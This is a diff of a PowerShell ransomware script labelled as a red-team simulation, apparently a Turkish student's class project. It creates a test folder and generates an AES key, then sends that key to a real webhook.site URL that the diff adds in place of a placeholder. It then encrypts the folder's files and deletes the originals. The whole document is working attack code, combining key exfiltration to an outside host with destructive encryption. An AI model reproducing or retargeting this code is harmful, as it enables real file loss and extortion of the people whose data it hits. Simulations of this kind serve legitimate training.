@@ -1,6 +1,6 @@
 ﻿# L15 Ransomware - Red Team Simulation
-$hedefDizin = "$HOME\Desktop\vize-proje\Simulasyon-L15\hassas_veriler"
-$webhookUrl = "BURAYA_WEBHOOK_LINKINI_YAPISTIR" 
+$hedefDizin = "$HOME\OneDrive\Masaüstü\vize-proje\Simulasyon-L15\hassas_veriler"
+$webhookUrl = "https://webhook.site/adae2d2a-5068-48c8-adb5-9b38b13c9f24" 
 
 # Test verisi oluştur
 if (!(Test-Path $hedefDizin)) { New-Item -ItemType Directory -Path $hedefDizin }
@@ -16,8 +16,10 @@ $key = [Convert]::ToBase64String($aes.Key)
 $body = @{ student = "Eray Turan"; status = "Compromised"; key = $key } | ConvertTo-Json
 try {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
+    Write-Host "[+] Basarili: Anahtar Webhook'a gonderildi!" -ForegroundColor Green
 } catch {
     Write-Host "[-] Baglanti Hatasi: Anahtar sizdirilamadi!" -ForegroundColor Red
+    Write-Host "Hata Detayi: $($_.Exception.Message)" -ForegroundColor Gray
 }
 
 # Dosyaları Şifrele
@@ -27,4 +29,4 @@ Get-ChildItem $hedefDizin -File | ForEach-Object {
     [System.IO.File]::WriteAllBytes(($_.FullName + ".enc"), $enc)
     Remove-Item $_.FullName
 }
-Write-Host "[!] SALDIRI TAMAMLANDI: Dosyalar sifrelendi ve anahtar sızdırıldı." -ForegroundColor Red
+Write-Host "[!] SALDIRI TAMAMLANDI: Dosyalar sifrelendi." -ForegroundColor Red
